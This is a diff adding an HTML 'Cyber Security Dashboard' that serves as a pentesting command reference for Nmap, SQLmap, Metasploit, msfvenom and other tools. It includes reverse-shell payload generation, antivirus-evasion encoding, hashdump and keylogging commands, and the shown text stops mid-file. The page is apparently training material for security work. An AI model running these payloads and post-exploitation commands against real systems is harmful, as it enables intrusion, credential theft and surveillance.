@@ -1,0 +1,1384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>AF143 | Cyber Security Dashboard</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root{
+  --bg:#0f1419;
+  --card:#141c24;
+  --accent:#00ff99;
+  --accent2:#00bfff;
+  --text:#e6e6e6;
+  --muted:#9aa4ad;
+}
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:Segoe UI,Tahoma,Arial;
+  background:var(--bg);
+  color:var(--text);
+}
+
+/* HEADER */
+header{
+  display:flex;
+  align-items:center;
+  gap:14px;
+  padding:14px 20px;
+  background:linear-gradient(90deg,#0a1f33,#0f3050);
+  border-bottom:2px solid var(--accent);
+}
+.toggle-btn{
+  font-size:20px;
+  cursor:pointer;
+  background:transparent;
+  color:var(--accent);
+  border:2px solid var(--accent);
+  border-radius:6px;
+  padding:4px 10px;
+}
+.logo{
+  font-weight:900;
+  letter-spacing:2px;
+  color:var(--accent2);
+}
+
+/* THEMES */
+.theme-btns{
+  margin-left:auto;
+  display:flex;
+  gap:8px;
+}
+.theme{
+  width:18px;
+  height:18px;
+  border-radius:50%;
+  cursor:pointer;
+  border:2px solid #000;
+}
+.t-green{background:#00ff99}
+.t-blue{background:#00bfff}
+.t-purple{background:#a855f7}
+.t-orange{background:#fb923c}
+
+/* LAYOUT */
+.layout{
+  display:flex;
+  min-height:calc(100vh - 70px);
+}
+
+/* SIDEBAR */
+.sidebar{
+  width:260px;
+  background:#0b1218;
+  border-right:2px solid var(--accent);
+  padding:14px;
+  position:fixed;
+  top:70px;
+  bottom:0;
+  transform:translateX(-100%);
+  transition:.35s;
+  overflow-y:auto;
+}
+.sidebar.active{transform:translateX(0)}
+
+.sidebar h3{
+  color:var(--accent2);
+  font-size:13px;
+  margin:16px 0 6px;
+  text-transform:uppercase;
+  font-family:"Segoe UI Semibold","Arial Black",Arial,sans-serif;
+  letter-spacing:1.2px;
+}
+
+.sidebar a{
+  display:block;
+  padding:8px 10px;
+  margin-bottom:4px;
+  border-radius:8px;
+  color:var(--text);
+  text-decoration:none;
+  font-size:14px;
+}
+.sidebar a:hover{
+  background:rgba(255,255,255,.05);
+  color:var(--accent);
+}
+.sidebar a.active{
+  background:linear-gradient(90deg,var(--accent),transparent);
+  color:#000;
+  font-weight:700;
+  box-shadow:0 0 10px var(--accent);
+}
+
+.sidebar input{
+  width:100%;
+  padding:8px;
+  border-radius:8px;
+  border:none;
+  margin-bottom:10px;
+  background:#141c24;
+  color:var(--text);
+}
+
+.sidebar .divider{
+  height:1px;
+  background:linear-gradient(90deg,transparent,var(--accent),transparent);
+  margin:12px 0;
+}
+
+/* CONTENT */
+.content{
+  padding:30px;
+  width:100%;
+  transition:.35s;
+}
+.content.shift{margin-left:260px}
+
+.card{
+  background:var(--card);
+  padding:24px;
+  border-radius:14px;
+  box-shadow:0 0 20px rgba(0,0,0,.5);
+}
+
+pre{
+  background:#000;
+  color:var(--accent);
+  padding:10px;
+  border-radius:10px;
+  white-space:pre-wrap;
+  word-wrap:break-word;
+  overflow-x:auto;
+}
+
+h2{color:var(--accent2)}
+p{line-height:1.6}
+
+/* RESPONSIVE */
+@media(max-width:768px){
+  .content.shift{margin-left:0}
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<button class="toggle-btn" onclick="toggleSidebar()">☰</button>
+<div class="logo">AF143 • Cyber Security</div>
+<div class="theme-btns">
+<div class="theme t-green" onclick="setTheme('#00ff99','#00bfff')"></div>
+<div class="theme t-blue" onclick="setTheme('#00bfff','#38bdf8')"></div>
+<div class="theme t-purple" onclick="setTheme('#a855f7','#c084fc')"></div>
+<div class="theme t-orange" onclick="setTheme('#fb923c','#fdba74')"></div>
+</div>
+</header>
+
+<div class="layout">
+
+<aside class="sidebar" id="sidebar">
+<input type="text" id="search" placeholder="Search tools...">
+
+<h3>Recon</h3>
+<a data-tool="nmap">Nmap</a>
+<a data-tool="harvester">theHarvester</a>
+<a data-tool="amass">Amass</a>
+<a data-tool="subfinder">Subfinder</a>
+<a data-tool="httpx">Httpx</a>
+<a data-tool="enum4linux">Enum4linux</a>
+<div class="divider"></div>
+
+<h3>Web</h3>
+<a data-tool="waf">WAFW00F</a>
+<a data-tool="nikto">Nikto</a>
+<a data-tool="gobuster">Gobuster</a>
+<a data-tool="dirsearch">Dirsearch</a>
+<a data-tool="burp">Burp Suite</a>
+<a data-tool="zap">OWASP ZAP</a>
+<a data-tool="wpscan">WPScan</a>
+
+<div class="divider"></div>
+
+<h3>Vulnerabilities</h3>
+<a data-tool="sqlmap">SQLmap</a>
+<a data-tool="nuclei">Nuclei</a>
+<a data-tool="nessus">Nessus</a>
+
+<div class="divider"></div>
+
+<h3>Exploitation</h3>
+<a data-tool="shannon">Shannon</a>
+<a data-tool="metasploit">Metasploit</a>
+<a data-tool="msfvenom">msfvenom</a>
+<a data-tool="netcat">Netcat</a>
+
+<div class="divider"></div>
+
+<h3>Authentication</h3>
+<a data-tool="hydra">Hydra</a>
+<a data-tool="medusa">Medusa</a>
+<a data-tool="john">John the Ripper</a>
+<a data-tool="hashcat">Hashcat</a>
+
+<div class="divider"></div>
+
+<h3>Wireless</h3>
+<a data-tool="aircrack">Aircrack-ng</a>
+<a data-tool="kismet">Kismet</a>
+<a data-tool="bettercap">Bettercap</a>
+
+<div class="divider"></div>
+
+<h3>Post</h3>
+<a data-tool="post">Post-Exploitation</a>
+</aside>
+
+<main class="content" id="content">
+<div class="card" id="toolContent">
+<h2>Welcome</h2>
+<p>Professional Cyber Security Command Reference (AF143)</p>
+</div>
+</main>
+
+</div>
+
+<script>
+const sidebar=document.getElementById('sidebar');
+const content=document.getElementById('content');
+const toolContent=document.getElementById('toolContent');
+const links=document.querySelectorAll('.sidebar a');
+
+function toggleSidebar(){
+  sidebar.classList.toggle('active');
+  content.classList.toggle('shift');
+}
+function closeSidebar(){
+  sidebar.classList.remove('active');
+  content.classList.remove('shift');
+}
+
+document.getElementById('search').addEventListener('input',e=>{
+  const q=e.target.value.toLowerCase();
+  links.forEach(l=>{
+    l.style.display=l.textContent.toLowerCase().includes(q)?'block':'none';
+  });
+});
+
+const tools = {
+/* ===================== RECON ===================== */
+nmap:`<h2>Nmap</h2>
+
+<p>Comprehensive Nmap command reference covering host discovery, port scanning, service detection, OS detection, NSE scripts, and evasion techniques.</p>
+
+<h3>Host Discovery</h3>
+
+<pre>nmap IP</pre>
+<p>Performs a default scan to check if the host is alive and scans common ports.</p>
+
+<pre>nmap 192.168.1.0/24</pre>
+<p>Scans all hosts within the specified subnet.</p>
+
+<pre>nmap -sn 192.168.1.0/24</pre>
+<p>Ping scan only to identify live hosts without port scanning.</p>
+
+<pre>nmap -Pn IP</pre>
+<p>Skips host discovery and assumes the target is online.</p>
+
+<pre>nmap -PS IP</pre>
+<p>Sends TCP SYN packets to detect live hosts.</p>
+
+<pre>nmap -PA IP</pre>
+<p>Sends TCP ACK packets to bypass some firewall rules.</p>
+
+<pre>nmap -PU IP</pre>
+<p>Uses UDP packets for host discovery.</p>
+
+<pre>nmap -PR 192.168.1.0/24</pre>
+<p>Uses ARP requests for accurate discovery on local networks.</p>
+
+<h3>Port Scanning</h3>
+
+<pre>nmap -p 80 IP</pre>
+<p>Scans only port 80 on the target.</p>
+
+<pre>nmap -p 80,443 IP</pre>
+<p>Scans multiple specified ports.</p>
+
+<pre>nmap -p 1-1000 IP</pre>
+<p>Scans a defined range of ports.</p>
+
+<pre>nmap -p- IP</pre>
+<p>Scans all 65535 TCP ports.</p>
+
+<pre>nmap --top-ports 100 IP</pre>
+<p>Scans the 100 most common ports.</p>
+
+<pre>nmap --top-ports 1000 IP</pre>
+<p>Scans the 1000 most commonly used ports.</p>
+
+<pre>nmap --open IP</pre>
+<p>Displays only open ports in the output.</p>
+
+<h3>Scan Techniques</h3>
+
+<pre>nmap -sS IP</pre>
+<p>Performs a stealth SYN scan (half-open scan).</p>
+
+<pre>nmap -sT IP</pre>
+<p>Uses a full TCP connection scan.</p>
+
+<pre>nmap -sU IP</pre>
+<p>Scans UDP services (slower but important).</p>
+
+<pre>nmap -sN IP</pre>
+<p>Uses a TCP NULL scan to bypass some filters.</p>
+
+<pre>nmap -sF IP</pre>
+<p>Uses a FIN scan technique.</p>
+
+<pre>nmap -sX IP</pre>
+<p>Uses Xmas scan with multiple TCP flags set.</p>
+
+<pre>nmap -sA IP</pre>
+<p>ACK scan to determine firewall rules.</p>
+
+<pre>nmap -sW IP</pre>
+<p>Window scan to infer port states.</p>
+
+<pre>nmap -sM IP</pre>
+<p>Maimon scan variation of FIN scan.</p>
+
+<h3>Service & Version Detection</h3>
+
+<pre>nmap -sV IP</pre>
+<p>Detects service versions running on open ports.</p>
+
+<pre>nmap --version-light IP</pre>
+<p>Performs light version detection (faster).</p>
+
+<pre>nmap --version-all IP</pre>
+<p>Performs full version detection (more accurate).</p>
+
+<pre>nmap -sV --version-intensity 9 IP</pre>
+<p>Uses maximum intensity for service version detection.</p>
+
+<h3>OS Detection</h3>
+
+<pre>nmap -O IP</pre>
+<p>Attempts to identify the operating system.</p>
+
+<pre>nmap -O --osscan-limit IP</pre>
+<p>Limits OS detection to promising targets.</p>
+
+<pre>nmap -O --osscan-guess IP</pre>
+<p>Makes aggressive OS guesses when uncertain.</p>
+
+<h3>Aggressive Scan</h3>
+
+<pre>nmap -A IP</pre>
+<p>Enables OS detection, version detection, script scanning, and traceroute.</p>
+
+<h3>NSE Scripts – Vulnerabilities</h3>
+
+<pre>nmap --script vuln IP</pre>
+<p>Runs vulnerability detection scripts.</p>
+
+<pre>nmap --script vuln -p 80 IP</pre>
+<p>Runs vulnerability scripts against port 80.</p>
+
+<h3>NSE Scripts – HTTP</h3>
+
+<pre>nmap --script http-enum IP</pre>
+<p>Enumerates directories and files on HTTP servers.</p>
+
+<pre>nmap --script http-title IP</pre>
+<p>Retrieves HTTP page titles.</p>
+
+<pre>nmap --script http-headers IP</pre>
+<p>Displays HTTP response headers.</p>
+
+<pre>nmap --script http-methods IP</pre>
+<p>Checks allowed HTTP methods.</p>
+
+<h3>NSE Scripts – SMB</h3>
+
+<pre>nmap --script smb-os-discovery IP</pre>
+<p>Identifies the operating system via SMB.</p>
+
+<pre>nmap --script smb-enum-shares IP</pre>
+<p>Enumerates SMB shared folders.</p>
+
+<pre>nmap --script smb-enum-users IP</pre>
+<p>Enumerates SMB users.</p>
+
+<h3>NSE Scripts – FTP</h3>
+
+<pre>nmap --script ftp-anon IP</pre>
+<p>Checks for anonymous FTP login access.</p>
+
+<h3>NSE Scripts – SSH</h3>
+
+<pre>nmap --script ssh-hostkey IP</pre>
+<p>Retrieves SSH host keys.</p>
+
+<pre>nmap --script ssh-auth-methods IP</pre>
+<p>Lists supported SSH authentication methods.</p>
+
+<h3>NSE Scripts – DNS</h3>
+
+<pre>nmap --script dns-brute domain.com</pre>
+<p>Performs DNS subdomain brute forcing.</p>
+
+<h3>NSE Scripts – SSL / TLS</h3>
+
+<pre>nmap --script ssl-cert IP</pre>
+<p>Retrieves SSL certificate information.</p>
+
+<pre>nmap --script ssl-enum-ciphers IP</pre>
+<p>Enumerates supported SSL/TLS ciphers.</p>
+
+<h3>Firewall / IDS Evasion</h3>
+
+<pre>nmap -f IP</pre>
+<p>Fragments packets to evade detection.</p>
+
+<pre>nmap --mtu 24 IP</pre>
+<p>Sets a custom MTU size for packet fragmentation.</p>
+
+<pre>nmap -D RND:10 IP</pre>
+<p>Uses decoy IP addresses to hide the real source.</p>
+
+<pre>nmap -S SPOOFED_IP IP</pre>
+<p>Spoofs the source IP address.</p>
+
+<pre>nmap --source-port 53 IP</pre>
+<p>Uses a trusted source port to bypass firewalls.</p>
+
+<pre>nmap --data-length 50 IP</pre>
+<p>Adds random data to packets to evade detection.</p>
+
+<h3>Output Formats</h3>
+
+<pre>nmap -oN scan.txt IP</pre>
+<p>Saves scan results in normal text format.</p>
+
+<pre>nmap -oX scan.xml IP</pre>
+<p>Saves scan results in XML format.</p>
+
+<pre>nmap -oG scan.gnmap IP</pre>
+<p>Saves results in grepable format.</p>
+
+<pre>nmap -oA scan_all IP</pre>
+<p>Saves results in all available formats.</p>
+
+<h3>Performance & Timing</h3>
+
+<pre>nmap -T0 IP</pre>
+<p>Uses paranoid timing (very slow, stealthy).</p>
+
+<pre>nmap -T3 IP</pre>
+<p>Uses normal timing (default).</p>
+
+<pre>nmap -T5 IP</pre>
+<p>Uses aggressive timing (very fast).</p>
+`,
+enum4linux:`<h2>Enum4linux</h2>
+
+<p>Enum4linux is an SMB enumeration tool used to extract users, shares, and domain information from Windows and Linux systems.</p>
+
+<pre>enum4linux IP</pre>
+<p>Performs basic SMB enumeration.</p>
+
+<pre>enum4linux -a IP</pre>
+<p>Runs all available enumeration options.</p>
+
+<pre>enum4linux -u user -p pass IP</pre>
+<p>Enumerates SMB using valid credentials.</p>
+
+<pre>enum4linux -S IP</pre>
+<p>Enumerates available SMB shares.</p>
+`,
+
+harvester:`<h2>theHarvester</h2>
+
+<p>theHarvester is an OSINT tool used to gather emails, subdomains, IP addresses, and public data from search engines.</p>
+
+<pre>theHarvester -d example.com -b google</pre>
+<p>Collects OSINT data for the target domain using Google.</p>
+
+<pre>theHarvester -d example.com -b bing</pre>
+<p>Uses Bing as the search engine source.</p>
+
+<pre>theHarvester -d example.com -b duckduckgo</pre>
+<p>Collects public data using DuckDuckGo.</p>
+
+<pre>theHarvester -d example.com -b all</pre>
+<p>Uses all available data sources.</p>
+
+<pre>theHarvester -d example.com -l 500 -b google</pre>
+<p>Limits the number of collected results to 500.</p>
+`,
+
+amass:`<h2>Amass</h2>
+
+<p>Amass is an advanced attack surface mapping tool for discovering subdomains using passive and active techniques.</p>
+
+<pre>amass enum -d example.com</pre>
+<p>Performs active subdomain enumeration.</p>
+
+<pre>amass enum -passive -d example.com</pre>
+<p>Uses passive data sources only.</p>
+
+<pre>amass enum -active -d example.com</pre>
+<p>Uses active techniques such as DNS probing.</p>
+
+<pre>amass intel -d example.com</pre>
+<p>Collects intelligence related to the target domain.</p>
+
+<pre>amass viz -d3 -d example.com</pre>
+<p>Visualizes discovered subdomains and relationships.</p>
+`,
+subfinder:`<h2>Subfinder</h2>
+
+<p>Subfinder is a fast passive subdomain discovery tool designed for automation and large-scale reconnaissance.</p>
+
+<pre>subfinder -d example.com</pre>
+<p>Finds subdomains related to the target domain.</p>
+
+<pre>subfinder -silent -d example.com</pre>
+<p>Runs without banners or extra output.</p>
+
+<pre>subfinder -all -d example.com</pre>
+<p>Uses all available passive sources.</p>
+
+<pre>subfinder -d example.com -o subs.txt</pre>
+<p>Saves discovered subdomains to a file.</p>
+`,
+
+httpx:`<h2>Httpx</h2>
+
+<p>Httpx is an HTTP probing tool used to identify live hosts, technologies, and response details.</p>
+
+<pre>httpx -u https://example.com</pre>
+<p>Checks if a single URL is alive.</p>
+
+<pre>httpx -l subs.txt</pre>
+<p>Probes a list of subdomains from a file.</p>
+
+<pre>httpx -l subs.txt -status-code -title</pre>
+<p>Displays HTTP status codes and page titles.</p>
+
+<pre>httpx -l subs.txt -tech-detect</pre>
+<p>Detects technologies used by the target.</p>
+
+<pre>httpx -l subs.txt -follow-redirects</pre>
+<p>Follows HTTP redirects during probing.</p>
+`,
+
+/* ===================== WEB ===================== */
+waf:`<h2>WAFW00F</h2>
+
+<p>WAFW00F is a tool used to detect and identify Web Application Firewalls protecting web applications.</p>
+
+<pre>wafw00f https://example.com</pre>
+<p>Checks if the target is protected by a Web Application Firewall.</p>
+
+<pre>wafw00f -a https://example.com</pre>
+<p>Performs aggressive detection to identify the WAF vendor.</p>
+
+<pre>wafw00f -l targets.txt</pre>
+<p>Scans multiple targets listed in a file.</p>
+`,
+
+nikto:`<h2>Nikto</h2>
+
+<p>Nikto is a web server vulnerability scanner that identifies outdated software, misconfigurations, and known issues.</p>
+
+<pre>nikto -h http://example.com</pre>
+<p>Scans the target web server for known vulnerabilities.</p>
+
+<pre>nikto -h https://example.com</pre>
+<p>Performs a vulnerability scan over HTTPS.</p>
+
+<pre>nikto -h example.com -p 8080</pre>
+<p>Scans a web server running on a custom port.</p>
+
+<pre>nikto -o result.txt -h example.com</pre>
+<p>Saves scan results to a file.</p>
+`,
+
+gobuster:`<h2>Gobuster</h2>
+
+<p>Gobuster is a brute-force tool used to discover hidden directories, files, DNS subdomains, and virtual hosts.</p>
+
+<pre>gobuster dir -u https://site.com -w wordlist.txt</pre>
+<p>Performs directory brute forcing using a wordlist.</p>
+
+<pre>gobuster dir -u https://site.com -w wordlist.txt -x php,html,txt</pre>
+<p>Searches for files with specific extensions.</p>
+
+<pre>gobuster dns -d example.com -w subs.txt</pre>
+<p>Performs DNS subdomain brute forcing.</p>
+
+<pre>gobuster vhost -u https://site.com -w vhosts.txt</pre>
+<p>Brute forces virtual hosts.</p>
+`,
+
+dirsearch:`<h2>Dirsearch</h2>
+
+<p>Dirsearch is an advanced directory and file brute-force tool for web applications.</p>
+
+<pre>dirsearch -u https://site.com</pre>
+<p>Performs a basic directory scan on the target.</p>
+
+<pre>dirsearch -u https://site.com -e php,html,js</pre>
+<p>Searches for directories and files with specific extensions.</p>
+
+<pre>dirsearch -u https://site.com -x 403,404</pre>
+<p>Excludes specific HTTP status codes from results.</p>
+
+<pre>dirsearch -u https://site.com --random-agent</pre>
+<p>Uses random User-Agent headers to evade detection.</p>
+`,
+
+burp:`<h2>Burp Suite</h2>
+
+<p>Burp Suite is a comprehensive platform for manual and automated web application security testing.</p>
+
+<pre>burpsuite</pre>
+<p>Launches the Burp Suite application.</p>
+
+<pre>Proxy → Intercept → On</pre>
+<p>Enables interception of HTTP requests.</p>
+
+<pre>Repeater</pre>
+<p>Allows manual modification and replay of requests.</p>
+
+<pre>Intruder</pre>
+<p>Used for fuzzing and brute-force attacks.</p>
+
+<pre>Decoder</pre>
+<p>Encodes and decodes data formats.</p>
+`,
+
+zap:`<h2>OWASP ZAP</h2>
+
+<p>OWASP ZAP is an open-source web application security scanner maintained by OWASP.</p>
+
+<pre>zaproxy</pre>
+<p>Starts the OWASP ZAP application.</p>
+
+<pre>Quick Scan → Automated Scan</pre>
+<p>Runs an automated vulnerability scan.</p>
+
+<pre>Spider</pre>
+<p>Crawls the web application to discover pages.</p>
+
+<pre>Active Scan</pre>
+<p>Actively tests discovered endpoints for vulnerabilities.</p>
+`,
+
+wpscan:`<h2>WPScan</h2>
+
+<p>WPScan is a specialized security scanner for WordPress websites.</p>
+
+<pre>wpscan --url https://site.com</pre>
+<p>Performs a basic WordPress security scan.</p>
+
+<pre>wpscan --url https://site.com --enumerate p</pre>
+<p>Enumerates installed WordPress plugins.</p>
+
+<pre>wpscan --url https://site.com --enumerate t</pre>
+<p>Enumerates installed WordPress themes.</p>
+
+<pre>wpscan --url https://site.com --enumerate u</pre>
+<p>Enumerates WordPress users.</p>
+
+<pre>wpscan --url https://site.com --passwords pass.txt --usernames admin</pre>
+<p>Performs a password attack against WordPress users.</p>
+`,
+
+/* ===================== VULNS ===================== */
+sqlmap:`<h2>SQLmap</h2>
+
+<p>SQLmap is an automated tool used to detect and exploit SQL Injection vulnerabilities in web applications.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1"</pre>
+<p>Tests the target URL for SQL Injection vulnerabilities.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1" --dbs</pre>
+<p>Enumerates available databases on the vulnerable server.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1" -D database --tables</pre>
+<p>Lists tables inside a specific database.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1" -D database -T users --dump</pre>
+<p>Dumps data from a specific table.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1" --os-shell</pre>
+<p>Attempts to gain an operating system shell.</p>
+
+<pre>sqlmap -u "http://site.com/page.php?id=1" --risk=3 --level=5</pre>
+<p>Uses aggressive testing levels for deeper exploitation.</p>
+`,
+
+nuclei:`<h2>Nuclei</h2>
+
+<p>Nuclei is a fast, template-based vulnerability scanner used to detect CVEs, misconfigurations, and exposures.</p>
+
+<pre>nuclei -u https://example.com</pre>
+<p>Scans a single target using default templates.</p>
+
+<pre>nuclei -l targets.txt</pre>
+<p>Scans multiple targets listed in a file.</p>
+
+<pre>nuclei -severity high,critical</pre>
+<p>Runs scans limited to high and critical severity issues.</p>
+
+<pre>nuclei -t cves/ -u https://example.com</pre>
+<p>Scans the target using CVE-specific templates.</p>
+
+<pre>nuclei -update-templates</pre>
+<p>Updates Nuclei templates to the latest version.</p>
+`,
+
+nessus:`<h2>Nessus</h2>
+
+<p>Nessus is an enterprise-grade vulnerability assessment tool used to identify security issues in systems and networks.</p>
+
+<pre>https://localhost:8834</pre>
+<p>Accesses the Nessus web interface.</p>
+
+<pre>New Scan → Advanced Scan</pre>
+<p>Creates a new advanced vulnerability scan.</p>
+
+<pre>Select Targets → Add IPs or Domains</pre>
+<p>Defines scan targets.</p>
+
+<pre>Launch Scan</pre>
+<p>Starts the vulnerability scanning process.</p>
+
+<pre>View Reports</pre>
+<p>Reviews discovered vulnerabilities and risk levels.</p>
+`, 
+
+/* ===================== EXPLOIT ===================== */
+shannon:`<h2>Shannon</h2>
+
+<p>Shannon is an Autonomous AI Pentester designed to perform real exploitation attempts against applications, not just theoretical vulnerability detection.</p>
+
+<h3>What Makes Shannon Different</h3>
+<p>Unlike traditional scanners, Shannon actively attempts exploitation and provides verified proof instead of false positives.</p>
+
+<h3>Supported Vulnerabilities</h3>
+<ul>
+  <li>SQL Injection</li>
+  <li>Cross-Site Scripting (XSS)</li>
+  <li>Authentication Bypass</li>
+  <li>Business Logic Flaws</li>
+  <li>Limited SSRF cases (application dependent)</li>
+</ul>
+
+<h3>Installation Requirements (Kali Linux)</h3>
+
+<pre>sudo apt update && sudo apt upgrade -y</pre>
+<p>Updates system packages.</p>
+
+<pre>sudo apt install docker.io docker-compose-plugin git curl -y</pre>
+<p>Installs required dependencies.</p>
+
+<pre>sudo systemctl start docker</pre>
+<p>Starts Docker service.</p>
+
+<pre>sudo systemctl enable docker</pre>
+<p>Enables Docker at boot.</p>
+
+<pre>sudo usermod -aG docker $USER</pre>
+<p>Adds current user to Docker group.</p>
+
+<h3>Verify Installation</h3>
+
+<pre>docker --version</pre>
+<p>Checks Docker installation.</p>
+
+<pre>docker compose version</pre>
+<p>Checks Docker Compose installation.</p>
+
+<h3>Download Shannon</h3>
+
+<pre>git clone https://github.com/KeygraphHQ/shannon.git</pre>
+<p>Clones the official Shannon repository.</p>
+
+<pre>cd shannon</pre>
+<p>Enters the Shannon directory.</p>
+
+<h3>Build Shannon Environment</h3>
+
+<pre>docker compose build --no-cache</pre>
+<p>Builds Shannon Docker environment from scratch.</p>
+
+<h3>Test Application (Juice Shop)</h3>
+
+<pre>docker run -d -p 3000:3000 --name test-app bkimminich/juice-shop</pre>
+<p>Runs a vulnerable web application for testing.</p>
+
+<h3>Configuration File</h3>
+
+<pre>echo 'target:
+  url: http://host.docker.internal:3000
+scan:
+  mode: autonomous' > config.yaml</pre>
+<p>Creates a basic autonomous scan configuration.</p>
+
+<h3>Run Autonomous Scan</h3>
+
+<pre>docker compose run --rm shannon scan</pre>
+<p>Starts the AI-driven exploitation process.</p>
+
+<h3>Example Result</h3>
+
+<pre>{
+  "vulnerability": "Stored XSS",
+  "verified": true,
+  "proof": "Exploitation successful with payload execution"
+}</pre>
+<p>Shows a verified vulnerability with real exploitation proof.</p>
+
+<h3>What Beginners Learn from Shannon</h3>
+<ul>
+  <li>How a penetration tester thinks</li>
+  <li>The difference between scanning and exploitation</li>
+  <li>Why business logic flaws are dangerous</li>
+  <li>How to evaluate security results correctly</li>
+</ul>
+`,
+metasploit:`<h2>Metasploit Framework</h2>
+
+<p>Metasploit is an advanced exploitation framework used to develop, test, and execute exploits against vulnerable systems.</p>
+
+<h3>Starting Metasploit</h3>
+
+<pre>msfconsole</pre>
+<p>Starts the Metasploit Framework console.</p>
+
+<h3>Searching Modules</h3>
+
+<pre>search exploit</pre>
+<p>Searches for exploit modules related to a keyword.</p>
+
+<pre>search type:exploit platform:linux</pre>
+<p>Searches exploits filtered by type and platform.</p>
+
+<pre>search cve:2021</pre>
+<p>Searches modules related to a specific CVE.</p>
+
+<h3>Using Modules</h3>
+
+<pre>use exploit/path</pre>
+<p>Selects a specific exploit module.</p>
+
+<pre>info</pre>
+<p>Displays detailed information about the selected module.</p>
+
+<pre>show options</pre>
+<p>Shows required and optional parameters for the module.</p>
+
+<pre>show payloads</pre>
+<p>Lists compatible payloads for the selected exploit.</p>
+
+<h3>Setting Options</h3>
+
+<pre>set RHOSTS IP</pre>
+<p>Sets the target IP address.</p>
+
+<pre>set RPORT 80</pre>
+<p>Sets the target service port.</p>
+
+<pre>set LHOST IP</pre>
+<p>Sets the local attacker IP for reverse connections.</p>
+
+<pre>set LPORT 4444</pre>
+<p>Sets the local listening port.</p>
+
+<pre>set PAYLOAD payload/path</pre>
+<p>Selects a specific payload.</p>
+
+<h3>Running Exploits</h3>
+
+<pre>run</pre>
+<p>Executes the selected exploit.</p>
+
+<pre>exploit</pre>
+<p>Runs the exploit (same as run).</p>
+
+<pre>exploit -j</pre>
+<p>Runs the exploit in the background as a job.</p>
+
+<h3>Sessions Management</h3>
+
+<pre>sessions</pre>
+<p>Lists all active sessions.</p>
+
+<pre>sessions -i 1</pre>
+<p>Interacts with a specific session.</p>
+
+<pre>sessions -k 1</pre>
+<p>Kills a specific session.</p>
+
+<pre>background</pre>
+<p>Sends the current session to background.</p>
+
+<h3>Meterpreter Basics</h3>
+
+<pre>sysinfo</pre>
+<p>Displays system information of the compromised host.</p>
+
+<pre>getuid</pre>
+<p>Shows the current user privileges.</p>
+
+<pre>ps</pre>
+<p>Lists running processes on the target.</p>
+
+<pre>shell</pre>
+<p>Drops into a system shell.</p>
+
+<h3>Privilege Escalation</h3>
+
+<pre>getsystem</pre>
+<p>Attempts to elevate privileges on Windows systems.</p>
+
+<pre>use exploit/multi/recon/local_exploit_suggester</pre>
+<p>Suggests possible local privilege escalation exploits.</p>
+
+<h3>Post-Exploitation</h3>
+
+<pre>hashdump</pre>
+<p>Dumps password hashes from the target system.</p>
+
+<pre>screenshot</pre>
+<p>Takes a screenshot of the target desktop.</p>
+
+<pre>keyscan_start</pre>
+<p>Starts keylogging on the target.</p>
+
+<pre>upload file.txt</pre>
+<p>Uploads a file to the target system.</p>
+
+<pre>download file.txt</pre>
+<p>Downloads a file from the target system.</p>
+
+<h3>Jobs Management</h3>
+
+<pre>jobs</pre>
+<p>Lists running background jobs.</p>
+
+<pre>jobs -k ID</pre>
+<p>Kills a specific job.</p>
+
+<h3>Database Commands</h3>
+
+<pre>db_status</pre>
+<p>Shows Metasploit database connection status.</p>
+
+<pre>hosts</pre>
+<p>Lists discovered hosts stored in the database.</p>
+
+<pre>services</pre>
+<p>Lists discovered services.</p>
+
+<h3>Exit</h3>
+
+<pre>exit</pre>
+<p>Exits the Metasploit console.</p>
+`,
+
+msfvenom:`<h2>msfvenom</h2>
+
+<p>Msfvenom is a payload generation tool used to create shellcode and malicious files for multiple platforms.</p>
+
+<h3>Listing Payloads</h3>
+
+<pre>msfvenom -l payloads</pre>
+<p>Lists all available payloads supported by Metasploit.</p>
+
+<pre>msfvenom -l encoders</pre>
+<p>Lists all available encoders.</p>
+
+<pre>msfvenom -l formats</pre>
+<p>Lists supported output formats.</p>
+
+<h3>Windows Payloads</h3>
+
+<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</pre>
+<p>Generates a Windows Meterpreter reverse TCP executable.</p>
+
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</pre>
+<p>Creates a basic Windows reverse shell executable.</p>
+
+<h3>Linux Payloads</h3>
+
+<pre>msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf</pre>
+<p>Generates a Linux ELF reverse shell payload.</p>
+
+<pre>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf</pre>
+<p>Creates a Linux Meterpreter reverse shell.</p>
+
+<h3>Android Payloads</h3>
+
+<pre>msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o app.apk</pre>
+<p>Generates a malicious Android APK with a Meterpreter payload.</p>
+
+<h3>Web Payloads</h3>
+
+<pre>msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php</pre>
+<p>Creates a PHP Meterpreter web shell.</p>
+
+<pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp</pre>
+<p>Generates a JSP reverse shell payload.</p>
+
+<h3>Encoding Payloads</h3>
+
+<pre>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe</pre>
+<p>Encodes the payload multiple times to evade antivirus detection.</p>
+
+<h3>Staged vs Stageless</h3>
+
+<pre>msfvenom -p windows/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe</pre>
+<p>Creates a stageless payload that contains all code in one file.</p>
+
+<h3>Shellcode Output</h3>
+
+<pre>msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -f c</pre>
+<p>Outputs shellcode in C format.</p>
+
+<pre>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f python</pre>
+<p>Outputs shellcode in Python format.</p>
+
+<h3>Bad Characters</h3>
+
